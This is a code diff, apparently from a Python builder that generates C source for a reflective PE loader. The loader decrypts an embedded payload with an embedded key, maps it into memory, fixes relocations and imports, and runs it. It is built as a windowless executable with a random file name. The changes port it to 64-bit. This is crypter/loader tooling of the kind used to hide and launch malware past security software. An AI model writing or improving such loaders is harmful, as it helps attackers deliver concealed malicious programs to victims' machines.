@@ -54,7 +54,7 @@ def build_single_exe_with_dll(exe_path):
 #pragma comment(linker, "/SUBSYSTEM:WINDOWS")
 #pragma comment(linker, "/ENTRY:mainCRTStartup")
 
-// Внешние бинарные данные (линкуются через objcopy)
+// Внешние бинарные данные
 extern unsigned char _binary_data_bin_start[];
 extern unsigned char _binary_data_bin_end[];
 extern unsigned char _binary_key_bin_start[];
@@ -87,7 +87,7 @@ void run_pe(unsigned char* pe_data, size_t pe_size) {
         }
     }
     
-    DWORD delta = (DWORD)base - nt->OptionalHeader.ImageBase;
+    DWORD64 delta = (DWORD64)base - nt->OptionalHeader.ImageBase;
     if (delta) {
         PIMAGE_BASE_RELOCATION rel = (PIMAGE_BASE_RELOCATION)(
             base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress
@@ -98,7 +98,7 @@ void run_pe(unsigned char* pe_data, size_t pe_size) {
             for (DWORD i = 0; i < count; i++) {
                 if (entries[i] >> 12 == IMAGE_REL_BASED_HIGHLOW) {
                     DWORD* addr = (DWORD*)(base + rel->VirtualAddress + (entries[i] & 0xFFF));
-                    *addr += delta;
+                    *addr += (DWORD)delta;
                 }
             }
             rel = (PIMAGE_BASE_RELOCATION)((char*)rel + rel->SizeOfBlock);
@@ -114,10 +114,10 @@ void run_pe(unsigned char* pe_data, size_t pe_size) {
         PIMAGE_THUNK_DATA func = (PIMAGE_THUNK_DATA)(base + imp->FirstThunk);
         while (thunk->u1.Function) {
             if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
-                func->u1.Function = (DWORD)GetProcAddress(h, (char*)(thunk->u1.Ordinal & 0xFFFF));
+                func->u1.Function = (ULONG_PTR)GetProcAddress(h, (char*)(thunk->u1.Ordinal & 0xFFFF));
             } else {
                 PIMAGE_IMPORT_BY_NAME name = (PIMAGE_IMPORT_BY_NAME)(base + thunk->u1.AddressOfData);
-                func->u1.Function = (DWORD)GetProcAddress(h, name->Name);
+                func->u1.Function = (ULONG_PTR)GetProcAddress(h, name->Name);
             }
             thunk++;
             func++;
@@ -145,14 +145,12 @@ void run_pe(unsigned char* pe_data, size_t pe_size) {
 }
 
 void run_payload() {
-    // Получаем данные из бинарных секций
     size_t data_size = _binary_data_bin_end - _binary_data_bin_start;
     size_t key_size = _binary_key_bin_end - _binary_key_bin_start;
     
     unsigned char* data = _binary_data_bin_start;
     unsigned char* key = _binary_key_bin_start;
     
-    // Копируем и расшифровываем
     unsigned char* decrypted = (unsigned char*)malloc(data_size);
     if (!decrypted) return;
     memcpy(decrypted, data, data_size);
@@ -184,12 +182,12 @@ int main() {
     
     print("Creating binary objects...")
     
-    # Конвертируем .bin в .o с помощью objcopy
     data_obj = os.path.join(output_dir, 'data.o')
     key_obj = os.path.join(output_dir, 'key.o')
     
-    subprocess.run(['objcopy', '-I', 'binary', '-O', 'elf32-i386', '-B', 'i386', data_bin, data_obj], capture_output=True)
-    subprocess.run(['objcopy', '-I', 'binary', '-O', 'elf32-i386', '-B', 'i386', key_bin, key_obj], capture_output=True)
+    # Используем правильную архитектуру
+    subprocess.run(['objcopy', '-I', 'binary', '-O', 'elf64-x86-64', '-B', 'i386:x86-64', data_bin, data_obj], capture_output=True)
+    subprocess.run(['objcopy', '-I', 'binary', '-O', 'elf64-x86-64', '-B', 'i386:x86-64', key_bin, key_obj], capture_output=True)
     
     print("Compiling reflective loader...")
     loader_exe = os.path.join(output_dir, f'loader_{generate_random_name()}.exe')
